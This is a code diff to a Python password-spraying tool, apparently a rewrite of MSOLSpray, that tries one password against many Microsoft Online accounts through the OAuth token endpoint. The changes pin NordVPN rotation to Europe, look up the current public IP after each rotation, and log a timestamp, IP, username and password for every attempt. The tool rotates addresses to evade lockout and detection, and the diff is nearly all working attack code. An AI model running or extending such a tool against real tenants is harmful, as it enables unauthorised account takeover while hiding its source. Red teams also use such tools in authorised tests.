@@ -3,6 +3,7 @@ import argparse
 import time
 import os
 from nordvpn_switcher import initialize_VPN,rotate_VPN,terminate_VPN
+import datetime
 
 description = """
 This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!
@@ -18,7 +19,6 @@ This command will use the provided userlist and attempt to authenticate to each 
 This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
     python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
 """
-
 parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
 
 parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
@@ -57,9 +57,9 @@ username_counter = 0
 lockout_counter = 0
 lockout_question = False
 unknownUsers = []
-
+logfile = open('logfile.txt','a')
 if vpn:
-    initialize_VPN(save=1,area_input=['complete rotation'])
+    initialize_VPN(save=1,area_input=['Europe'])
 
 for username in usernames:
 
@@ -68,6 +68,7 @@ for username in usernames:
     
     if vpn and username_counter%15==0:
         rotate_VPN()
+        ip = requests.get("https://ifconfig.me").content.decode('utf-8')
 
     username_counter += 1
     print(f"{username_counter} of {username_count} users tested", end="\r")
@@ -99,7 +100,9 @@ for username in usernames:
     }
 
     r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
-
+    time_posted = datetime.datetime.now()
+    log = f"{time_posted},{ip},{username},{password}\n"
+    logfile.write(log)
     if r.status_code == 200:
         print(f"SUCCESS! {username} : {password}")
         results += f"{username} : {password}\n"
